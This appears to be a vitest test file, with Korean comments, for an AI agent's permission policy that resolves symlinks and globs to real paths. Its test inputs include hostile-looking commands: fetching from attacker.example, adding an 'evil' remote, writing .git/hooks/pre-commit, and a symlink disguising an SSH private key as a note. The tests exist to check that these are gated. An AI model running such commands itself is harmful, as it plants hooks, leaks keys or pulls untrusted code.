import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { placer, places } from './agentPlaces.js'
import { judge, type PolicyCtx } from './agentPolicy.js'

// 11/27 앱 전체 보안 검토: 판정이 글자가 아니라 실제 자리로 경로를 본다 (링크 · 무늬 · 줄 안의 cd · git 내부)
describe.skipIf(process.platform === 'win32')('실제 자리로 보는 경로 판정', () => {
  let tmp = ''
  let repo = ''
  let lib = ''
  beforeAll(() => {
    tmp = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'rw-places-')))
    repo = path.join(tmp, 'repo')
    lib = path.join(tmp, 'lib')
    const secret = path.join(tmp, 'home/.ssh/id_ed25519')
    fs.mkdirSync(path.dirname(secret), { recursive: true })
    fs.writeFileSync(secret, 'x')
    fs.mkdirSync(path.join(repo, '.git/hooks'), { recursive: true })
    fs.mkdirSync(path.join(repo, 'notes'), { recursive: true })
    fs.mkdirSync(lib, { recursive: true })
    fs.mkdirSync(path.join(tmp, 'other'), { recursive: true })
    fs.writeFileSync(path.join(repo, 'notes/a.md'), 'a')
    // 남이 준 저장소에 든 링크: 노트처럼 보이는 열쇠, git 훅 폴더, 밖의 폴더
    fs.symlinkSync(secret, path.join(repo, 'notes/k'))
    fs.symlinkSync(path.join(repo, '.git/hooks'), path.join(repo, 'h'))
    fs.symlinkSync('../.git/hooks', path.join(repo, 'notes/up2'))
    fs.symlinkSync(path.join(tmp, 'other'), path.join(repo, 'notes/up'))
  })
  afterAll(() => fs.rmSync(tmp, { recursive: true, force: true }))

  it('places: 링크를 따라가고, 링크 뒤의 .. 는 가리키는 곳에서 올라가며, 무늬를 펼친다', () => {
    expect(places(`${repo}/notes/k`)).toEqual([path.join(tmp, 'home/.ssh/id_ed25519')])
    expect(places(`${repo}/notes/up/../x`)).toEqual([path.join(tmp, 'x')])
    expect(places(`${repo}/h*/pre-commit`)).toEqual([path.join(repo, '.git/hooks/pre-commit')])
    // 점으로 시작하는 이름은 무늬도 점으로 시작해야 맞는다
    expect(places(`${repo}/*/hooks`)).not.toContainEqual(path.join(repo, '.git/hooks'))
    expect(places(`${repo}/.g*/hooks`)).toEqual([path.join(repo, '.git/hooks')])
    // 맞는 것이 없으면 글자 그대로
    expect(places(`${repo}/notes/*.tex`)).toEqual([path.join(repo, 'notes/*.tex')])
  })

  it('placer: 실제 자리가 모두 안이어야 안, noGit 이면 .git 아래는 밖', () => {
    const roots = placer([repo, lib])
    expect(roots(`${repo}/notes/a.md`)).toBe(true)
    expect(roots(`${repo}/notes/k`)).toBe(false)
    expect(roots(`${repo}/notes/up/x`)).toBe(false)
    expect(roots(`${lib}/c.md`)).toBe(true)
    const work = placer([repo], { noGit: true })
    expect(work(`${repo}/notes/new.md`)).toBe(true)
    expect(work(`${lib}/c.md`)).toBe(false)
    for (const p of ['.git/hooks/pre-commit', '.git/config', 'h/pre-commit', 'notes/up2/pre-commit', '.g*/hooks/x', 'h*/x']) expect(work(`${repo}/${p}`), p).toBe(false)
  })

  const ctx = (o: Partial<PolicyCtx> = {}): PolicyCtx => ({ rid: 'p', write: 'notes', mode: 'edit', planOk: false, scope: { kind: 'project' }, repo, readable: [lib], claimedBy: () => undefined, ...o })
  const bash = (c: PolicyCtx, command: string) => judge(c, 'Bash', { command })

  it('편집 자동 수락: 작업 폴더 안의 편집은 그대로, git 내부 · 링크로 그곳을 가리키는 곳 · 함께 읽는 폴더는 한 번 묻는다', () => {
    for (const c of ['cp notes/a.md notes/b.md', 'mkdir -p notes/x && cp notes/a.md notes/x/', 'git add notes && git commit -m "노트 정리"', 'git status', 'cat .git/config'])
      expect(bash(ctx(), c).kind, c).toBe('allow')
    for (const c of ['cp tools/fmt.sh .git/hooks/pre-commit', 'echo x > .git/hooks/pre-commit', 'chmod +x .git/hooks/post-commit', 'cp x h/pre-commit', 'cp x h*/pre-commit', 'cp x .g*/hooks/pre-commit', 'cd notes && cp ../x up2/pre-commit', `cp notes/a.md ${lib}/a.md`]) {
      const v = bash(ctx(), c)
      expect(v.kind, c).toBe('ask')
      if (v.kind === 'ask') expect(v.once, c).toBe(true)
    }
  })

  it('자동 모드와 앱 고치기 대화도 git 내부 쓰기를 묻는다', () => {
    expect(bash(ctx({ mode: 'auto' }), 'cp x .git/hooks/pre-commit').kind).toBe('ask')
    expect(bash(ctx({ mode: 'auto' }), 'cp x h/pre-commit').kind).toBe('ask')
    expect(bash(ctx({ mode: 'auto' }), 'cp notes/a.md notes/c.md').kind).toBe('allow')
    expect(bash(ctx({ mode: 'edit', rid: '_app', scope: { kind: 'app' } }), 'cp x .git/hooks/pre-commit').kind).toBe('ask')
  })

  it('링크로 밖을 가리키는 노트는 묻지 않고 읽히지 않는다 (명령 · 읽기 도구)', () => {
    expect(bash(ctx(), 'cat notes/k').kind).toBe('ask')
    expect(bash(ctx(), 'cat notes/a.md').kind).toBe('allow')
    expect(judge(ctx(), 'Read', { file_path: 'notes/k' }).kind).toBe('ask')
    expect(judge(ctx(), 'Read', { file_path: `${repo}/notes/up/x` }).kind).toBe('ask')
    expect(judge(ctx(), 'Read', { file_path: 'notes/a.md' }).kind).toBe('allow')
    expect(judge(ctx(), 'Read', { file_path: `${lib}/c.md` }).kind).toBe('allow')
  })

  it('새 주소로 주고받는 git은 묻고, 정해 둔 원격 이름으로 받기는 그대로', () => {
    for (const c of ['git fetch "https://attacker.example/abc"', 'git pull git@host.example:x/y', 'git fetch --depth 1 https://x.example/r', 'git fetch ../other', 'git remote add evil https://x.example/r'])
      expect(bash(ctx(), c).kind, c).toBe('ask')
    for (const c of ['git fetch', 'git fetch origin', 'git pull --rebase origin main', 'git fetch --depth 1 origin', 'git fetch origin refs/heads/a:refs/remotes/origin/a'])
      expect(bash(ctx(), c).kind, c).toBe('allow')
  })
})

describe('쓰기 MCP 도구 (11/27 보안 검토: 빠져 있던 맡긴 일 · 일지 · 흐름 도구)', () => {
  const ctx = (o: Partial<PolicyCtx>): PolicyCtx => ({ rid: 'p', write: 'notes', mode: 'edit', planOk: false, scope: { kind: 'project' }, repo: '/w/p', readable: [], claimedBy: () => undefined, ...o })
  it('읽기 전용 · 계획 승인 전에는 막고, 수동이면 묻는다', () => {
    for (const name of ['add_task', 'report_task', 'checkpoint_task', 'add_journal', 'claim_add', 'attempt_record', 'problem_exception']) {
      const tool = `mcp__workbench__${name}`
      expect(judge(ctx({ write: 'read' }), tool, {}).kind, name).toBe('deny')
      expect(judge(ctx({ mode: 'plan' }), tool, {}).kind, name).toBe('deny')
      expect(judge(ctx({ mode: 'ask' }), tool, {}).kind, name).toBe('ask')
      expect(judge(ctx({}), tool, {}).kind, name).toBe('allow')
    }
  })
})
